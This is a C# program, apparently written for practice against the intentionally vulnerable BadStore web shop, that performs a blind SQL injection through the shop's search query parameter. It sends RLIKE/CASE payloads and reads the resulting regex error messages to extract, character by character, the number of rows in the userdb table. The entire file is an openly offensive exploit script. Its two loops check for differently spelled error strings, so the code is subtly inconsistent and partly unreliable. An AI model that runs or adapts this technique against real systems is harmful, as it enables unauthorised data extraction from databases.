using System;
using System.Net;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace blind_sqli
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            int countLength = 1;
            for (;;countLength++)
            {
                string getCountLength = "test' RLIKE (SELECT (CASE WHEN ((SELECT";
                getCountLength += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";
                getCountLength += " userdb)=" + countLength + ") THEN 0x28 ELSE 0x41 END))";
                getCountLength += " AND 'LeSo'='LeSo";

                string response = MakeRequest(getCountLength);
                if (response.Contains("parenthese not balanced"))
                    break;
            }
            List<byte> countBytes = new List<byte>();
            for (int i = 1; i <= countLength; i++)
            {
                for (int c = 48; c <= 58; c++)
                {
                    string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                    getCount += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb),";
                    getCount += i + ", 1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND '";
                    string response = MakeRequest(getCount);

                    if (response.Contains("parentheses not balanced"))
                    {
                        countBytes.Add((byte)c);
                        break;
                    }
                }
            }

            int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            Console.WriteLine("There are " + count + " rows in the userdb table");
        }
        private static string MakeRequest(string payload)
        {
            string url = "http://www.badstore.net/cgi-bin/badstore.cgi?action=search&searchquery=";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + payload);
            //HttpWebRequest request = (HttpWebRequest)WebRequest.Create (url + payload);

            string response = string.Empty;
            using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                response = reader.ReadToEnd();

            return response;
        }
    }
}
